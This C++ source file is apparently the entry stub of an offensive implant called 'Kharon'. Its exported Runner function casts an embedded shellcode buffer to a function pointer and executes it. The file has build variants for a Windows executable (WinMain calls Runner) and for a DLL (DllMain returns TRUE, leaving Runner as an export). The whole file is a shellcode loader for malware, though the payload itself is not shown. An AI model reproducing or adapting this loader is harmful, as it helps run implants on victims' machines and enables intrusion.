#include <Externs.h>
#include <Agent.h>

auto DLLEXPORT Runner( VOID ) -> VOID {
    VOID ( *Kharon )( VOID ) = ( decltype( Kharon ) )Shellcode;
    Kharon();
}

#if KH_MAIN == KH_WINMAIN
auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
}
#endif

#if KH_MAIN == KH_DLLMAIN
auto WINAPI DllMain(
    HINSTANCE DllInstance,
    ULONG     Reason, 
    PVOID     Reserved
) -> BOOL {
    switch( Reason ) { 
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            if (Reserved != nullptr)
            {
                break;
            }
            break;
    }
    return TRUE;
}
#endif